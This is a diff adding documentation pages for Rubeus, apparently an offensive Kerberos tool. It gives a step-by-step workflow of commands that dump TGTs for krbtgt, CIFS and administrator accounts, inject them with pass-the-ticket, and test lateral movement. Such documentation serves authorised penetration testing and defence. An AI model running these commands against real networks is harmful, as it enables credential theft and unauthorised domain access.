+</Tabs>
+
+<Steps>
+  <Step title="Reconnaissance Phase">
+    **Initial Assessment:**
+    ```bash
+    # Quick ticket overview
+    Rubeus.exe triage
+
+    # Session enumeration
+    Rubeus.exe logonsession
+
+    # Current user tickets
+    Rubeus.exe klist
+    ```
+
+    **Target Identification:**
+    - Identify high-value sessions
+    - Locate administrative accounts
+    - Map available services
+    - Assess delegation opportunities
+  </Step>
+
+  <Step title="Targeted Extraction">
+    **Strategic Harvesting:**
+    ```bash
+    # Extract valuable TGTs
+    Rubeus.exe dump /service:krbtgt /nowrap
+
+    # Service-specific extraction
+    Rubeus.exe dump /service:cifs /nowrap
+
+    # User-targeted operations
+    Rubeus.exe dump /user:administrator /nowrap
+    ```
+
+    **Documentation:**
+    - Record extraction timestamps
+    - Note ticket validity periods
+    - Document source sessions
+    - Track service relationships
+  </Step>
+
+  <Step title="Analysis & Validation">
+    **Ticket Assessment:**
+    ```bash
+    # Detailed ticket analysis
+    Rubeus.exe describe /ticket:[base64]
+
+    # Encryption validation
+    # Flag interpretation
+    # Principal verification
+    ```
+
+    **Quality Control:**
+    - Verify ticket integrity
+    - Check expiration times
+    - Validate service principals
+    - Assess encryption strength
+  </Step>
+
+  <Step title="Utilization & Testing">
+    **Ticket Injection:**
+    ```bash
+    # Inject extracted tickets
+    Rubeus.exe ptt /ticket:[base64]
+
+    # Verify injection success
+    Rubeus.exe klist
+
+    # Test access capabilities
+    dir \\target.domain.com\share
+    ```
+
+    **Operational Testing:**
+    - Validate service access
+    - Test lateral movement
+    - Confirm privilege levels
+    - Document successful paths
+  </Step>
+</Steps>
+
+<CardGroup cols={3}>
+  <Card title="Quick Enumeration" icon="list" href="/ghostpack-docs/Rubeus-mdx/commands/extraction/triage">
+    **triage** - Fast ticket overview and session mapping
+  </Card>
+  <Card title="Detailed Listing" icon="table" href="/ghostpack-docs/Rubeus-mdx/commands/extraction/klist">
+    **klist** - Comprehensive current ticket analysis
+  </Card>
+  <Card title="Ticket Analysis" icon="magnifying-glass" href="/ghostpack-docs/Rubeus-mdx/commands/management/describe">
+    **describe** - Deep ticket structure examination
+  </Card>
+  <Card title="Ticket Injection" icon="upload" href="/ghostpack-docs/Rubeus-mdx/commands/management/ptt">
+    **ptt** - Pass extracted tickets to sessions
+  </Card>
+  <Card title="Real-time Monitoring" icon="radar" href="/ghostpack-docs/Rubeus-mdx/commands/extraction/monitor">
+    **monitor** - Continuous ticket capture
+  </Card>
+  <Card title="Automated Collection" icon="robot" href="/ghostpack-docs/Rubeus-mdx/commands/extraction/harvest">
+    **harvest** - Systematic ticket harvesting
+  </Card>
+</CardGroup>
